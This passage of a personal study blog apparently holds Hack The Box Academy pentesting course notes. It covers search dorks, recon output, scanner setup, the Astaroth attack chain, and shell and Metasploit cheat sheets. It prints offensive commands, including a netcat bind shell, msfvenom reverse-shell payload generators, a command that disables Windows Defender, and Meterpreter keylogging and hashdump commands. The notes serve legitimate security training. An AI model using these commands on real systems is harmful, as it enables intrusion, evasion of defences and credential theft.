style=text-align:left><code>define:</code></td><td style=text-align:left>Provides definitions of a word or phrase.</td><td style=text-align:left><code>define:phishing</code></td><td style=text-align:left>Get a definition of &ldquo;phishing&rdquo; from various sources.</td></tr><tr><td style=text-align:left><code>numrange:</code></td><td style=text-align:left>Searches for numbers within a specific range.</td><td style=text-align:left><code>site:example.com numrange:1000-2000</code></td><td style=text-align:left>Find pages on example.com containing numbers between 1000 and 2000.</td></tr><tr><td style=text-align:left><code>allintext:</code></td><td style=text-align:left>Finds pages containing all specified words in the body text.</td><td style=text-align:left><code>allintext:admin password reset</code></td><td style=text-align:left>Search for pages containing both &ldquo;admin&rdquo; and &ldquo;password reset&rdquo; in the body text.</td></tr><tr><td style=text-align:left><code>allinurl:</code></td><td style=text-align:left>Finds pages containing all specified words in the URL.</td><td style=text-align:left><code>allinurl:admin panel</code></td><td style=text-align:left>Look for pages with &ldquo;admin&rdquo; and &ldquo;panel&rdquo; in the URL.</td></tr><tr><td style=text-align:left><code>allintitle:</code></td><td style=text-align:left>Finds pages containing all specified words in the title.</td><td style=text-align:left><code>allintitle:confidential report 2023</code></td><td style=text-align:left>Search for pages with &ldquo;confidential,&rdquo; &ldquo;report,&rdquo; and &ldquo;2023&rdquo; in the title.</td></tr><tr><td style=text-align:left><code>AND</code></td><td style=text-align:left>Narrows results by requiring all terms to be present.</td><td style=text-align:left><code>site:example.com AND (inurl:admin OR inurl:login)</code></td><td style=text-align:left>Find admin or login pages specifically on example.com.</td></tr><tr><td style=text-align:left><code>OR</code></td><td style=text-align:left>Broadens results by including pages with any of the terms.</td><td style=text-align:left><code>"linux" OR "ubuntu" OR "debian"</code></td><td style=text-align:left>Search for webpages mentioning Linux, Ubuntu, or Debian.</td></tr><tr><td style=text-align:left><code>NOT</code></td><td style=text-align:left>Excludes results containing the specified term.</td><td style=text-align:left><code>site:bank.com NOT inurl:login</code></td><td style=text-align:left>Find pages on bank.com excluding login pages.</td></tr><tr><td style=text-align:left><code>*</code> (wildcard)</td><td style=text-align:left>Represents any character or word.</td><td style=text-align:left><code>site:socialnetwork.com filetype:pdf user* manual</code></td><td style=text-align:left>Search for user manuals (user guide, user handbook) in PDF format on socialnetwork.com.</td></tr><tr><td style=text-align:left><code>..</code> (range search)</td><td style=text-align:left>Finds results within a specified numerical range.</td><td style=text-align:left><code>site:ecommerce.com "price" 100..500</code></td><td style=text-align:left>Look for products priced between 100 and 500 on an e-commerce website.</td></tr><tr><td style=text-align:left><code>" "</code> (quotation marks)</td><td style=text-align:left>Searches for exact phrases.</td><td style=text-align:left><code>"information security policy"</code></td><td style=text-align:left>Find documents mentioning the exact phrase &ldquo;information security policy&rdquo;.</td></tr><tr><td style=text-align:left><code>-</code> (minus sign)</td><td style=text-align:left>Excludes terms from the search results.</td><td style=text-align:left><code>site:news.com -inurl:sports</code></td><td style=text-align:left>Search for news articles on news.com excluding sports-related content.</td></tr></tbody></table><h2 id=automating-recon>Automating Recon<a hidden class=anchor aria-hidden=true href=#automating-recon>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ ./finalrecon.py --headers --whois --url http://inlanefreight.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> ______  __   __   __   ______   __
</span></span><span class=line><span class=cl>/<span class=se>\ </span> ___<span class=se>\/\ \ </span>/<span class=se>\ </span><span class=s2>&#34;-.\ \ /\  __ \ /\ \
</span></span></span><span class=line><span class=cl><span class=s2>\ \  __\\ \ \\ \ \-.  \\ \  __ \\ \ \____
</span></span></span><span class=line><span class=cl><span class=s2> \ \_\   \ \_\\ \_\\&#34;</span><span class=se>\_\\</span> <span class=se>\_\ \_\\</span> <span class=se>\_</span>____<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  <span class=se>\/</span>_/    <span class=se>\/</span>_/ <span class=se>\/</span>_/ <span class=se>\/</span>_/ <span class=se>\/</span>_/<span class=se>\/</span>_/ <span class=se>\/</span>_____/
</span></span><span class=line><span class=cl> ______   ______   ______   ______   __   __
</span></span><span class=line><span class=cl>/<span class=se>\ </span> <span class=o>==</span> <span class=se>\ </span>/<span class=se>\ </span> ___<span class=se>\ </span>/<span class=se>\ </span> ___<span class=se>\ </span>/<span class=se>\ </span> __ <span class=se>\ </span>/<span class=se>\ </span><span class=s2>&#34;-.\ \
</span></span></span><span class=line><span class=cl><span class=s2>\ \  __&lt; \ \  __\ \ \ \____\ \ \/\ \\ \ \-.  \
</span></span></span><span class=line><span class=cl><span class=s2> \ \_\ \_\\ \_____\\ \_____\\ \_____\\ \_\\&#34;</span><span class=se>\_\
</span></span></span><span class=line><span class=cl><span class=se></span>  <span class=se>\/</span>_/ /_/ <span class=se>\/</span>_____/ <span class=se>\/</span>_____/ <span class=se>\/</span>_____/ <span class=se>\/</span>_/ <span class=se>\/</span>_/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>&gt;<span class=o>]</span> Created By   : thewhiteh4t
</span></span><span class=line><span class=cl> <span class=p>|</span>---&gt; Twitter   : https://twitter.com/thewhiteh4t
</span></span><span class=line><span class=cl> <span class=p>|</span>---&gt; Community : https://twc1rcle.com/
</span></span><span class=line><span class=cl><span class=o>[</span>&gt;<span class=o>]</span> Version      : 1.1.6
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Target : http://inlanefreight.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> IP Address : 134.209.24.248
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Headers :
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Date : Tue, <span class=m>11</span> Jun <span class=m>2024</span> 10:08:00 GMT
</span></span><span class=line><span class=cl>Server : Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>Link : &lt;https://www.inlanefreight.com/index.php/wp-json/&gt;<span class=p>;</span> <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;https://api.w.org/&#34;</span>, &lt;https://www.inlanefreight.com/index.php/wp-json/wp/v2/pages/7&gt;<span class=p>;</span> <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;alternate&#34;</span><span class=p>;</span> <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;application/json&#34;</span>, &lt;https://www.inlanefreight.com/&gt;<span class=p>;</span> <span class=nv>rel</span><span class=o>=</span>shortlink
</span></span><span class=line><span class=cl>Vary : Accept-Encoding
</span></span><span class=line><span class=cl>Content-Encoding : gzip
</span></span><span class=line><span class=cl>Content-Length : <span class=m>5483</span>
</span></span><span class=line><span class=cl>Keep-Alive : <span class=nv>timeout</span><span class=o>=</span>5, <span class=nv>max</span><span class=o>=</span><span class=m>100</span>
</span></span><span class=line><span class=cl>Connection : Keep-Alive
</span></span><span class=line><span class=cl>Content-Type : text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>UTF-8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Whois Lookup :
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Domain Name: INLANEFREIGHT.COM
</span></span><span class=line><span class=cl>   Registry Domain ID: 2420436757_DOMAIN_COM-VRSN
</span></span><span class=line><span class=cl>   Registrar WHOIS Server: whois.registrar.amazon.com
</span></span><span class=line><span class=cl>   Registrar URL: http://registrar.amazon.com
</span></span><span class=line><span class=cl>   Updated Date: 2023-07-03T01:11:15Z
</span></span><span class=line><span class=cl>   Creation Date: 2019-08-05T22:43:09Z
</span></span><span class=line><span class=cl>   Registry Expiry Date: 2024-08-05T22:43:09Z
</span></span><span class=line><span class=cl>   Registrar: Amazon Registrar, Inc.
</span></span><span class=line><span class=cl>   Registrar IANA ID: <span class=m>468</span>
</span></span><span class=line><span class=cl>   Registrar Abuse Contact Email: abuse@amazonaws.com
</span></span><span class=line><span class=cl>   Registrar Abuse Contact Phone: +1.2024422253
</span></span><span class=line><span class=cl>   Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
</span></span><span class=line><span class=cl>   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
</span></span><span class=line><span class=cl>   Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
</span></span><span class=line><span class=cl>   Name Server: NS-1303.AWSDNS-34.ORG
</span></span><span class=line><span class=cl>   Name Server: NS-1580.AWSDNS-05.CO.UK
</span></span><span class=line><span class=cl>   Name Server: NS-161.AWSDNS-20.COM
</span></span><span class=line><span class=cl>   Name Server: NS-671.AWSDNS-19.NET
</span></span><span class=line><span class=cl>   DNSSEC: unsigned
</span></span><span class=line><span class=cl>   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Completed in 0:00:00.257780
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Exported : /home/htb-ac-643601/.local/share/finalrecon/dumps/fr_inlanefreight.com_11-06-2024_11:07:59
</span></span></code></pre></div><h3 id=complete-4>Complete<a hidden class=anchor aria-hidden=true href=#complete-4>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/144 title="Link of Completion" target=_blank rel="nofollow noopener">Link of Completion</a></p><h2 id=vulnerability-assessment>Vulnerability Assessment<a hidden class=anchor aria-hidden=true href=#vulnerability-assessment>#</a></h2><h3 id=vulnerability-scanning>Vulnerability Scanning<a hidden class=anchor aria-hidden=true href=#vulnerability-scanning>#</a></h3><p><strong>Nessus Overview</strong></p><p><a href=https://community.tenable.com/s/article/Nessus-Essentials title="Nessus Essentials" target=_blank rel="nofollow noopener">Nessus Essentials</a> by Tenable (<a href="https://www.tenable.com/downloads/nessus?loginAttempted=true" title="Download Page" target=_blank rel="nofollow noopener">Download Page</a>)is the free version of the official Nessus Vulnerability Scanner. Individuals can access Nessus Essentials to get started understanding Tenable&rsquo;s vulnerability scanner. The caveat is that it can only be used for up to 16 hosts. The features in the free version are limited but are perfect for someone looking to get started with Nessus. The free scanner will attempt to identify vulnerabilities in an environment.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo systemctl start nessusd.service
</span></span></code></pre></div><ul><li><code>https://localhost:8834</code></li></ul><p><strong>OpenVAS Overview</strong></p><p><a href=https://www.openvas.org/ title=OpenVAS target=_blank rel="nofollow noopener">OpenVAS</a> by Greenbone Networks is a publicly available open-source vulnerability scanner. OpenVAS can perform network scans, including authenticated and unauthenticated testing.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo apt-get update <span class=o>&amp;&amp;</span> apt-get -y full-upgrade
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ sudo apt-get install gvm <span class=o>&amp;&amp;</span> openvas
</span></span><span class=line><span class=cl>woadey@htb<span class=o>[</span>/htb<span class=o>]</span>$ gvm-setup
</span></span></code></pre></div><h3 id=completion>Completion<a hidden class=anchor aria-hidden=true href=#completion>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/108 title="Link of Completion" target=_blank rel="nofollow noopener">Link of Completion</a></p><h2 id=file-transfers>File transfers<a hidden class=anchor aria-hidden=true href=#file-transfers>#</a></h2><h3 id=astaroth-attack>Astaroth Attack<a hidden class=anchor aria-hidden=true href=#astaroth-attack>#</a></h3><p>The <code>Astaroth attack</code> generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the <a href=https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic title="WMIC tool" target=_blank rel="nofollow noopener">WMIC tool</a> with the &ldquo;/Format&rdquo; parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the <a href=https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool title="Bitsadmin tool" target=_blank rel="nofollow noopener">Bitsadmin tool</a>.</p><p>All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The <a href=https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32 title=regsvr32 target=_blank rel="nofollow noopener">regsvr32</a> tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the Userinit process. Below is a graphical depiction of the attack.<figure class=image-caption><img alt=chain srcset="/posts/htb/pentester/images/chain.i_hu10215987156308084105.webp 480w,
/posts/htb/pentester/images/chain.i_hu8684326354152032130.webp 768w,
/posts/htb/pentester/images/chain.i_hu14407041507126191078.webp 1024w" sizes=100vw src=images/chain.i.png width=768 height=637 loading=lazy style=filter:var(--invert-img)><figcaption></figcaption></figure></p><h3 id=living-off-the-land>Living off The Land<a hidden class=anchor aria-hidden=true href=#living-off-the-land>#</a></h3><ul><li><a href=https://lolbas-project.github.io/ title="LOLBAS Project for Windows Binaries" target=_blank rel="nofollow noopener">LOLBAS Project for Windows Binaries</a></li><li><a href=https://gtfobins.github.io/ title="GTFOBins for Linux Binaries" target=_blank rel="nofollow noopener">GTFOBins for Linux Binaries</a></li></ul><h3 id=completion-1>Completion<a hidden class=anchor aria-hidden=true href=#completion-1>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/24 title="Link of Completion" target=_blank rel="nofollow noopener">Link of Completion</a></p><h2 id=shells-and-payloads>Shells and Payloads<a hidden class=anchor aria-hidden=true href=#shells-and-payloads>#</a></h2><h3 id=bind-shells>Bind Shells<a hidden class=anchor aria-hidden=true href=#bind-shells>#</a></h3><p>With a bind shell, the <code>target</code> system has a listener started and awaits a connection from a pentester&rsquo;s system (attack box).</p><p><figure class=image-caption><img alt=bind srcset="/posts/htb/pentester/images/bindshell_hu17104079221990495092.webp 480w,
/posts/htb/pentester/images/bindshell_hu3151792226521863669.webp 768w,
/posts/htb/pentester/images/bindshell_hu4480552139637158041.webp 1024w" sizes=100vw src=images/bindshell.png width=768 height=446 loading=lazy><figcaption></figcaption></figure></p><h3 id=reverse-shells>Reverse Shells<a hidden class=anchor aria-hidden=true href=#reverse-shells>#</a></h3><p>With a reverse shell, the <code>attack box</code> will have a listener running, and the target will need to initiate the connection.</p><p><figure class=image-caption><img alt=reverse srcset="/posts/htb/pentester/images/reverseshell_hu2673774916427889250.webp 480w,
/posts/htb/pentester/images/reverseshell_hu12818279963310663513.webp 768w,
/posts/htb/pentester/images/reverseshell_hu10721017457583315833.webp 1024w" sizes=100vw src=images/reverseshell.png width=768 height=446 loading=lazy><figcaption></figcaption></figure></p><h3 id=laudanum-one-webshell-to-rule-them-all>Laudanum, One Webshell to Rule Them All<a hidden class=anchor aria-hidden=true href=#laudanum-one-webshell-to-rule-them-all>#</a></h3><p>Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include <code>asp</code>, <code>aspx</code>, <code>jsp</code>, <code>php</code>, and more. This is a staple to have on any pentest. If you are using your own VM, Laudanum is built into Parrot OS and Kali by default. For any other distro, you will likely need to pull a copy down to use. You can get it <a href=https://github.com/jbarcia/Web-Shells/tree/master/laudanum title=here target=_blank rel="nofollow noopener">here</a>.</p><h3 id=cheatsheet>Cheatsheet<a hidden class=anchor aria-hidden=true href=#cheatsheet>#</a></h3><table><thead><tr><th style=text-align:left>Commands</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!</code></td><td style=text-align:left>CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol</td></tr><tr><td style=text-align:left><code>env</code></td><td style=text-align:left>Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use</td></tr><tr><td style=text-align:left><code>sudo nc -lvnp &lt;port #></code></td><td style=text-align:left>Starts a netcat listener on a specified port</td></tr><tr><td style=text-align:left><code>nc -nv &lt;ip address of computer with listener started>&lt;port being listened on></code></td><td style=text-align:left>Connects to a netcat listener at the specified IP address and port</td></tr><tr><td style=text-align:left><code>rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&amp;1 | nc -l 10.129.41.200 7777 > /tmp/f</code></td><td style=text-align:left>Uses netcat to bind a shell (/bin/bash) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on</td></tr><tr><td style=text-align:left><code>Set-MpPreference -DisableRealtimeMonitoring $true</code></td><td style=text-align:left>Powershell command using to disable real time monitoring in Windows Defender</td></tr><tr><td style=text-align:left><code>use exploit/windows/smb/psexec</code></td><td style=text-align:left>Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing smb & psexec</td></tr><tr><td style=text-align:left><code>shell</code></td><td style=text-align:left>Command used in a meterpreter shell session to drop into a system shell</td></tr><tr><td style=text-align:left><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf</code></td><td style=text-align:left>MSFvenom command used to generate a linux-based reverse shell stageless payload</td></tr><tr><td style=text-align:left><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe</code></td><td style=text-align:left>MSFvenom command used to generate a Windows-based reverse shell stageless payload</td></tr><tr><td style=text-align:left><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho</code></td><td style=text-align:left>MSFvenom command used to generate a MacOS-based reverse shell payload</td></tr><tr><td style=text-align:left><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp</code></td><td style=text-align:left>MSFvenom command used to generate a ASP web reverse shell payload</td></tr><tr><td style=text-align:left><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp</code></td><td style=text-align:left>MSFvenom command used to generate a JSP web reverse shell payload</td></tr><tr><td style=text-align:left><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war</code></td><td style=text-align:left>MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload</td></tr><tr><td style=text-align:left><code>use auxiliary/scanner/smb/smb_ms17_010</code></td><td style=text-align:left>Metasploit exploit module used to check if a host is vulnerable to ms17_010</td></tr><tr><td style=text-align:left><code>use exploit/windows/smb/ms17_010_psexec</code></td><td style=text-align:left>Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17_010</td></tr><tr><td style=text-align:left><code>use exploit/linux/http/rconfig_vendors_auth_file_upload_rce</code></td><td style=text-align:left>Metasploit exploit module that can be used to obtain a reverse shell on a vulnerable linux system hosting rConfig 3.9.6</td></tr><tr><td style=text-align:left><code>python -c 'import pty; pty.spawn("/bin/sh")'</code></td><td style=text-align:left>Python command used to spawn an interactive shell on a linux-based system</td></tr><tr><td style=text-align:left><code>/bin/sh -i</code></td><td style=text-align:left>Spawns an interactive shell on a linux-based system</td></tr><tr><td style=text-align:left><code>perl —e 'exec "/bin/sh";'</code></td><td style=text-align:left>Uses perl to spawn an interactive shell on a linux-based system</td></tr><tr><td style=text-align:left><code>ruby: exec "/bin/sh"</code></td><td style=text-align:left>Uses ruby to spawn an interactive shell on a linux-based system</td></tr><tr><td style=text-align:left><code>Lua: os.execute('/bin/sh')</code></td><td style=text-align:left>Uses Lua to spawn an interactive shell on a linux-based system</td></tr><tr><td style=text-align:left><code>awk 'BEGIN {system("/bin/sh")}'</code></td><td style=text-align:left>Uses awk command to spawn an interactive shell on a linux-based system</td></tr><tr><td style=text-align:left><code>find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;</code></td><td style=text-align:left>Uses find command to spawn an interactive shell on a linux-based system</td></tr><tr><td style=text-align:left><code>find . -exec /bin/sh \; -quit</code></td><td style=text-align:left>An alternative way to use the find command to spawn an interactive shell on a linux-based system</td></tr><tr><td style=text-align:left><code>vim -c ':!/bin/sh'</code></td><td style=text-align:left>Uses the text-editor VIM to spawn an interactive shell. Can be used to escape &ldquo;jail-shells&rdquo;</td></tr><tr><td style=text-align:left><code>ls -la &lt;path/to/fileorbinary></code></td><td style=text-align:left>Used to list files & directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute</td></tr><tr><td style=text-align:left><code>sudo -l</code></td><td style=text-align:left>Displays the commands that the currently logged on user can run as sudo</td></tr><tr><td style=text-align:left><code>/usr/share/webshells/laudanum</code></td><td style=text-align:left>Location of laudanum webshells on ParrotOS and Pwnbox</td></tr><tr><td style=text-align:left><code>/usr/share/nishang/Antak-WebShell</code></td><td style=text-align:left>Location of Antak-Webshell on Parrot OS and Pwnbox</td></tr></tbody></table><h3 id=complete-5>Complete<a hidden class=anchor aria-hidden=true href=#complete-5>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/115 title="Link of Completion" target=_blank rel="nofollow noopener">Link of Completion</a></p><h2 id=using-the-metasploit-framework>Using the Metasploit Framework<a hidden class=anchor aria-hidden=true href=#using-the-metasploit-framework>#</a></h2><h3 id=cheatsheet-1>Cheatsheet<a hidden class=anchor aria-hidden=true href=#cheatsheet-1>#</a></h3><p><strong>MSFconsole Commands</strong></p><table><thead><tr><th style=text-align:left><strong>Command</strong></th><th style=text-align:left><strong>Description</strong></th></tr></thead><tbody><tr><td style=text-align:left><code>show exploits</code></td><td style=text-align:left>Show all exploits within the Framework.</td></tr><tr><td style=text-align:left><code>show payloads</code></td><td style=text-align:left>Show all payloads within the Framework.</td></tr><tr><td style=text-align:left><code>show auxiliary</code></td><td style=text-align:left>Show all auxiliary modules within the Framework.</td></tr><tr><td style=text-align:left><code>search &lt;name></code></td><td style=text-align:left>Search for exploits or modules within the Framework.</td></tr><tr><td style=text-align:left><code>info</code></td><td style=text-align:left>Load information about a specific exploit or module.</td></tr><tr><td style=text-align:left><code>use &lt;name></code></td><td style=text-align:left>Load an exploit or module (example: use windows/smb/psexec).</td></tr><tr><td style=text-align:left><code>use &lt;number></code></td><td style=text-align:left>Load an exploit by using the index number displayed after the search &lt;name> command.</td></tr><tr><td style=text-align:left><code>LHOST</code></td><td style=text-align:left>Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells.</td></tr><tr><td style=text-align:left><code>RHOST</code></td><td style=text-align:left>The remote host or the target. set function Set a specific value (for example, LHOST or RHOST).</td></tr><tr><td style=text-align:left><code>setg &lt;function></code></td><td style=text-align:left>Set a specific value globally (for example, LHOST or RHOST).</td></tr><tr><td style=text-align:left><code>show options</code></td><td style=text-align:left>Show the options available for a module or exploit.</td></tr><tr><td style=text-align:left><code>show targets</code></td><td style=text-align:left>Show the platforms supported by the exploit.</td></tr><tr><td style=text-align:left><code>set target &lt;number></code></td><td style=text-align:left>Specify a specific target index if you know the OS and service pack.</td></tr><tr><td style=text-align:left><code>set payload &lt;payload></code></td><td style=text-align:left>Specify the payload to use.</td></tr><tr><td style=text-align:left><code>set payload &lt;number></code></td><td style=text-align:left>Specify the payload index number to use after the show payloads command.</td></tr><tr><td style=text-align:left><code>show advanced</code></td><td style=text-align:left>Show advanced options.</td></tr><tr><td style=text-align:left><code>set autorunscript migrate -f</code></td><td style=text-align:left>Automatically migrate to a separate process upon exploit completion.</td></tr><tr><td style=text-align:left><code>check</code></td><td style=text-align:left>Determine whether a target is vulnerable to an attack.</td></tr><tr><td style=text-align:left><code>exploit</code></td><td style=text-align:left>Execute the module or exploit and attack the target.</td></tr><tr><td style=text-align:left><code>exploit -j</code></td><td style=text-align:left>Run the exploit under the context of the job. (This will run the exploit in the background.)</td></tr><tr><td style=text-align:left><code>exploit -z</code></td><td style=text-align:left>Do not interact with the session after successful exploitation.</td></tr><tr><td style=text-align:left><code>exploit -e &lt;encoder></code></td><td style=text-align:left>Specify the payload encoder to use (example: exploit –e shikata_ga_nai).</td></tr><tr><td style=text-align:left><code>exploit -h</code></td><td style=text-align:left>Display help for the exploit command.</td></tr><tr><td style=text-align:left><code>sessions -l</code></td><td style=text-align:left>List available sessions (used when handling multiple shells).</td></tr><tr><td style=text-align:left><code>sessions -l -v</code></td><td style=text-align:left>List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system.</td></tr><tr><td style=text-align:left><code>sessions -s &lt;script></code></td><td style=text-align:left>Run a specific Meterpreter script on all Meterpreter live sessions.</td></tr><tr><td style=text-align:left><code>sessions -K</code></td><td style=text-align:left>Kill all live sessions.</td></tr><tr><td style=text-align:left><code>sessions -c &lt;cmd></code></td><td style=text-align:left>Execute a command on all live Meterpreter sessions.</td></tr><tr><td style=text-align:left><code>sessions -u &lt;sessionID></code></td><td style=text-align:left>Upgrade a normal Win32 shell to a Meterpreter console.</td></tr><tr><td style=text-align:left><code>db_create &lt;name></code></td><td style=text-align:left>Create a database to use with database-driven attacks (example: db_create autopwn).</td></tr><tr><td style=text-align:left><code>db_connect &lt;name></code></td><td style=text-align:left>Create and connect to a database for driven attacks (example: db_connect autopwn).</td></tr><tr><td style=text-align:left><code>db_nmap</code></td><td style=text-align:left>Use Nmap and place results in a database. (Normal Nmap syntax is supported, such as –sT –v –P0.)</td></tr><tr><td style=text-align:left><code>db_destroy</code></td><td style=text-align:left>Delete the current database.</td></tr><tr><td style=text-align:left><code>db_destroy &lt;user:password@host:port/database></code></td><td style=text-align:left>Delete database using advanced options.</td></tr><tr><td style=text-align:left></td><td style=text-align:left></td></tr></tbody></table><p><strong>Meterpreter Commands</strong></p><table><thead><tr><th style=text-align:left><strong>Command</strong></th><th style=text-align:left><strong>Description</strong></th></tr></thead><tbody><tr><td style=text-align:left><code>help</code></td><td style=text-align:left>Open Meterpreter usage help.</td></tr><tr><td style=text-align:left><code>run &lt;scriptname></code></td><td style=text-align:left>Run Meterpreter-based scripts; for a full list check the scripts/meterpreter directory.</td></tr><tr><td style=text-align:left><code>sysinfo</code></td><td style=text-align:left>Show the system information on the compromised target.</td></tr><tr><td style=text-align:left><code>ls</code></td><td style=text-align:left>List the files and folders on the target.</td></tr><tr><td style=text-align:left><code>use priv</code></td><td style=text-align:left>Load the privilege extension for extended Meterpreter libraries.</td></tr><tr><td style=text-align:left><code>ps</code></td><td style=text-align:left>Show all running processes and which accounts are associated with each process.</td></tr><tr><td style=text-align:left><code>migrate &lt;proc. id></code></td><td style=text-align:left>Migrate to the specific process ID (PID is the target process ID gained from the ps command).</td></tr><tr><td style=text-align:left><code>use incognito</code></td><td style=text-align:left>Load incognito functions. (Used for token stealing and impersonation on a target machine.)</td></tr><tr><td style=text-align:left><code>list_tokens -u</code></td><td style=text-align:left>List available tokens on the target by user.</td></tr><tr><td style=text-align:left><code>list_tokens -g</code></td><td style=text-align:left>List available tokens on the target by group.</td></tr><tr><td style=text-align:left><code>impersonate_token &lt;DOMAIN_NAMEUSERNAME></code></td><td style=text-align:left>Impersonate a token available on the target.</td></tr><tr><td style=text-align:left><code>steal_token &lt;proc. id></code></td><td style=text-align:left>Steal the tokens available for a given process and impersonate that token.</td></tr><tr><td style=text-align:left><code>drop_token</code></td><td style=text-align:left>Stop impersonating the current token.</td></tr><tr><td style=text-align:left><code>getsystem</code></td><td style=text-align:left>Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.</td></tr><tr><td style=text-align:left><code>shell</code></td><td style=text-align:left>Drop into an interactive shell with all available tokens.</td></tr><tr><td style=text-align:left><code>execute -f &lt;cmd.exe> -i</code></td><td style=text-align:left>Execute cmd.exe and interact with it.</td></tr><tr><td style=text-align:left><code>execute -f &lt;cmd.exe> -i -t</code></td><td style=text-align:left>Execute cmd.exe with all available tokens.</td></tr><tr><td style=text-align:left><code>execute -f &lt;cmd.exe> -i -H -t</code></td><td style=text-align:left>Execute cmd.exe with all available tokens and make it a hidden process.</td></tr><tr><td style=text-align:left><code>rev2self</code></td><td style=text-align:left>Revert back to the original user you used to compromise the target.</td></tr><tr><td style=text-align:left><code>reg &lt;command></code></td><td style=text-align:left>Interact, create, delete, query, set, and much more in the target’s registry.</td></tr><tr><td style=text-align:left><code>setdesktop &lt;number></code></td><td style=text-align:left>Switch to a different screen based on who is logged in.</td></tr><tr><td style=text-align:left><code>screenshot</code></td><td style=text-align:left>Take a screenshot of the target’s screen.</td></tr><tr><td style=text-align:left><code>upload &lt;filename></code></td><td style=text-align:left>Upload a file to the target.</td></tr><tr><td style=text-align:left><code>download &lt;filename></code></td><td style=text-align:left>Download a file from the target.</td></tr><tr><td style=text-align:left><code>keyscan_start</code></td><td style=text-align:left>Start sniffing keystrokes on the remote target.</td></tr><tr><td style=text-align:left><code>keyscan_dump</code></td><td style=text-align:left>Dump the remote keys captured on the target.</td></tr><tr><td style=text-align:left><code>keyscan_stop</code></td><td style=text-align:left>Stop sniffing keystrokes on the remote target.</td></tr><tr><td style=text-align:left><code>getprivs</code></td><td style=text-align:left>Get as many privileges as possible on the target.</td></tr><tr><td style=text-align:left><code>uictl enable &lt;keyboard/mouse></code></td><td style=text-align:left>Take control of the keyboard and/or mouse.</td></tr><tr><td style=text-align:left><code>background</code></td><td style=text-align:left>Run your current Meterpreter shell in the background.</td></tr><tr><td style=text-align:left><code>hashdump</code></td><td style=text-align:left>Dump all hashes on the target. use sniffer Load the sniffer module.</td></tr><tr><td 